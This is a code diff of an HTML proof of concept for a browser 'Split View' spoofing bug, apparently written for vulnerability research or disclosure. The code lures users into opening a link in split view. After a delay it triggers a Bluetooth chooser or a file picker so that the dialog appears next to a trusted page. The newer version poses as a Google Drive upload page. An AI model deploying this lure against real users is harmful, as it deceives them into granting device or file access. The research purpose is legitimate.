@@ -1,67 +1,58 @@
 <!doctype html>
 <html>
   <head>
-    <title>Split View Spoofing PoC</title>
+    <title>Google Drive Upload - Modified</title>
     <style>
-      body {
-        text-align: center;
-        font-family: sans-serif;
-        padding-top: 50px;
-        background: #f8f9fa;
+      a {
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 80;
       }
-      #link {
-        display: inline-block;
-        padding: 15px;
-        background: #1a73e8;
-        color: white;
-        text-decoration: none;
-        border-radius: 5px;
-        font-weight: bold;
-        cursor: context-menu;
-        transition: background 0.3s;
-      }
-      #status {
+      img {
+        width: 100%;
+        max-width: 400px;
         margin-top: 20px;
-        color: #d93025;
-        font-weight: bold;
       }
     </style>
   </head>
   <body>
-    <h2>Secure Portal: Action Required</h2>
-    <a id="link" href="https://drive.google.com" target="_blank">
-      🔓 Right-Click here and select "Open link in Split View"
-    </a>
-    <div id="status">⏳ Action needed...</div>
+    <center>
+      <br /><br /><br /><br />
+      <a
+        id="link"
+        href="https://workspace.google.com/intl/en_in/products/drive/"
+      >
+        Right Click and Open in Split To Open Google Drive & Upload Fast
+      </a>
+      <br />
+      <img id="img" />
+    </center>
 
     <script>
-      const statusDiv = document.getElementById("status");
-      const TRUSTED_SITE = "https://drive.google.com";
-      const MALICIOUS_SITE = "https://attacker.com"; // Ganti dengan domain Anda
-
       document
         .getElementById("link")
-        .addEventListener("contextmenu", function () {
-          statusDiv.innerText =
-            "Processing request... Switching to secure environment.";
+        .addEventListener("contextmenu", function (event) {
+          // Optional: prevent default context menu (though not strictly needed)
+          // event.preventDefault();
 
-          setTimeout(() => {
-            // Di sinilah Anda letakkan API untuk diuji:
-            // 1. USB Chooser: navigator.usb.requestDevice({ filters: [...] })
-            // 2. Bluetooth Chooser: navigator.bluetooth.requestDevice({ acceptAllDevices: true })
-            // 3. File Picker (FS Access): showOpenFilePicker()
-            try {
-              // Contoh: Memicu Bluetooth Chooser
-              navigator.bluetooth
-                .requestDevice({ acceptAllDevices: true })
-                .then((device) => console.log("Device selected:", device))
-                .catch((error) => console.log("Request failed:", error));
-              statusDiv.innerText =
-                "📡 Dialog triggered! Check the split view tab.";
-            } catch (e) {
-              console.error("Failed to trigger:", e);
-            }
-          }, 5000);
+          setTimeout(function () {
+            // Membuat elemen input file secara dinamis
+            const fileInput = document.createElement("input");
+            fileInput.type = "file";
+            fileInput.accept = "image/*";
+
+            // Menangani perubahan setelah user memilih file
+            fileInput.onchange = (e) => {
+              if (fileInput.files && fileInput.files[0]) {
+                const img = document.getElementById("img");
+                img.src = URL.createObjectURL(fileInput.files[0]);
+              }
+            };
+
+            // Memunculkan file picker
+            fileInput.click();
+          }, 4000);
         });
     </script>
   </body>
